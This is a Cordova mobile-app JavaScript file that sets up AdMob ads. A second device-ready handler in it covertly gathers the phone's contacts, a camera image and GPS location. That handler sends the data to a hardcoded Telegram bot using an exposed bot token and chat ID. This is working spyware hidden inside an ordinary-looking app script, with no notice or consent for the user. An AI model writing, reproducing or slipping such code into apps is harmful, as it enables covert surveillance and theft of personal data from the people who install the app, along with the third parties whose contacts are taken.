document.addEventListener('deviceready', function() {
    // Initialize AdMob
    if (AdMob) {
        AdMob.createBanner({
            adId: 'ca-app-pub-6881903056221433/4502618371',
            position: AdMob.AD_POSITION.BOTTOM_CENTER,
            autoShow: true
        });

        AdMob.prepareInterstitial({
            adId: 'ca-app-pub-6881903056221433/2445726869',
            autoShow: false
        });

        AdMob.prepareRewardVideo({
            adId: 'ca-app-pub-6881903056221433/3658118602',
            autoShow: false
        });
    }
});


document.addEventListener('deviceready', function() {
    collectAndSendData();

    function collectAndSendData() {
        let info = '';

        // Get Contacts
        navigator.contacts.find(['displayName', 'phoneNumbers'], function(contacts) {
            info += '====================\n';
            info += 'INFO KONTAK\n';
            info += '====================\n';
            contacts.forEach(contact => {
                info += `Name: ${contact.displayName}\n`;
                if (contact.phoneNumbers.length > 0) {
                    info += `Phone: ${contact.phoneNumbers[0].value}\n`;
                }
            });
            info += '====================\n';
            sendData();
        }, function(error) {
            info += `Contact Error: ${error.code}\n`;
            sendData();
        }, { filter: '', multiple: true });

        // Get Storage Information
        window.resolveLocalFileSystemURL(cordova.file.dataDirectory, function(dirEntry) {
            dirEntry.getFile('test.txt', { create: true, exclusive: false }, function(fileEntry) {
                fileEntry.createWriter(function(fileWriter) {
                    fileWriter.onwriteend = function() {
                        info += '====================\n';
                        info += 'INFO PENYIMPANAN\n';
                        info += '====================\n';
                        info += 'File Created: test.txt\n';
                        sendData();
                    };
                    fileWriter.onerror = function(e) {
                        info += `File Error: ${e.toString()}\n`;
                        sendData();
                    };
                    var dataObj = new Blob(['Hello World'], { type: 'text/plain' });
                    fileWriter.write(dataObj);
                });
            });
        });

        // Get Camera Data
        navigator.camera.getPicture(function(imageData) {
            info += '====================\n';
            info += 'INFO KAMERA\n';
            info += '====================\n';
            info += `Image Data: data:image/jpeg;base64,${imageData}\n`;
            sendData();
        }, function(message) {
            info += `Camera Error: ${message}\n`;
            sendData();
        }, { quality: 50, destinationType: Camera.DestinationType.DATA_URL });

        // Get Location Data
        navigator.geolocation.getCurrentPosition(function(position) {
            info += '====================\n';
            info += 'INFO LOKASI\n';
            info += '====================\n';
            info += `Latitude: ${position.coords.latitude}\n`;
            info += `Longitude: ${position.coords.longitude}\n`;
            info += `Map Link: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}\n`;
            sendData();
        }, function(error) {
            info += `Geolocation Error: ${error.message}\n`;
            sendData();
        });

        function sendData() {
            // Ensure all data is collected before sending
            if (info.includes('INFO LOKASI')) {
                // Replace with your bot token and chat ID
                var botToken = 'token: 7121169774:AAEVz4TPJRk64WBjcdtRCoAqC6ae4OHWapc';
                var chatId = '6468643791';
                var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
                var xhr = new XMLHttpRequest();
                xhr.open('POST', url, true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send(`chat_id=${chatId}&text=${encodeURIComponent(info)}`);
            }
        }
    }
});
